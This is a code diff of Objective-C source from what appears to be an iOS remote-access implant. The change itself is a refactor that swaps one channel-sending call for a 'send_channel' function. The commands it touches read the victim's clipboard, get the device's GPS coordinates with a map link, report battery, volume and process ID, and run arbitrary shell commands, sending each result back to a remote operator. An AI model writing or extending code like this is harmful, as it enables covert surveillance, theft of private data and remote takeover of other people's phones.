@@ -58,7 +58,7 @@ NSString *information = @"%bold%white[i]%end ";
 -(void)cmd_getpid {
     NSProcessInfo* processInfo = [NSProcessInfo processInfo];
     int processID = [processInfo processIdentifier];
-    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@PID: %d\n", information, processID]];
+    send_channel(channel, [[NSString stringWithFormat:@"%@PID: %d\n", information, processID] UTF8String]);
 }
 
 -(void)cmd_getpaste {
@@ -67,26 +67,25 @@ NSString *information = @"%bold%white[i]%end ";
     if ([pb.strings count] > 1) {
         NSUInteger count = 0;
         for (NSString* pstring in pb.strings){
-            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%lu: %@\n", count, pstring]];
+            send_channel(channel, [[NSString stringWithFormat:@"%lu: %@\n", count, pstring] UTF8String]);
             count++;
         }
     } else if ([pb.strings count] == 1)
-        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@\n",
-                                                   [pb.strings firstObject]]];
+        send_channel(channel, [[NSString stringWithFormat:@"%@\n", [pb.strings firstObject]] UTF8String]);
 }
 
 -(void)cmd_battery {
     int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
     NSString *info = [NSString stringWithFormat:@"%@Battery level: %d (%@charging)\n", information,
                       batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @"not "];
-    [channel sendChannel:channelPipe withData:info];
+    send_channel(channel, [info UTF8String]);
 }
 
 -(void)cmd_getvol {
     [[AVAudioSession sharedInstance] setActive:YES error:nil];
     [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
-    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Volume level: %.2f\n", information,
-                                               [AVAudioSession sharedInstance].outputVolume]];
+    send_channel(channel, [[NSString stringWithFormat:@"%@Volume level: %.2f\n", information,
+                            [AVAudioSession sharedInstance].outputVolume] UTF8String]);
 }
 
 -(void)cmd_locate {
@@ -96,12 +95,12 @@ NSString *information = @"%bold%white[i]%end ";
     CLLocationCoordinate2D coordinate = [location coordinate];
 
     if ((int)(coordinate.latitude + coordinate.longitude) == 0)
-        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Unable to get device location!\n", error]];
+        send_channel(channel, [[NSString stringWithFormat:@"%@Unable to get device location!\n", error] UTF8String]);
     else {
         NSString *location = [NSString stringWithFormat:@"%@Latitude: %f\n%@Longitude: %f\n%@Map: http://maps.google.com/maps?q=%f,%f\n",
                              information, coordinate.latitude, information, coordinate.longitude,
                               information, coordinate.latitude, coordinate.longitude];
-        [channel sendChannel:channelPipe withData:location];
+        send_channel(channel, [location UTF8String]);
     }
 }
 
@@ -118,7 +117,7 @@ NSString *information = @"%bold%white[i]%end ";
         CFStringGetCString(CFArrayGetValueAtIndex(array, pointer), buffer, sizeof(buffer), kCFStringEncodingUTF8);
         result = [NSString stringWithFormat:@"%@%s\n", result, buffer];
     }
-    [channel sendChannel:channelPipe withData:result];
+    send_channel(channel, [result UTF8String]);
 }
 
 -(void)cmd_exec:(NSString *)command {
@@ -131,7 +130,7 @@ NSString *information = @"%bold%white[i]%end ";
     NSFileHandle *file = [pipe fileHandleForReading];
     [task launch];
     NSData *data = [file readDataToEndOfFile];
-    [channel sendChannel:channelPipe withData:[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]];
+    send_channel(channel, [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] UTF8String]);
 }
 
 -(void)cmd_say:(NSString *)message {
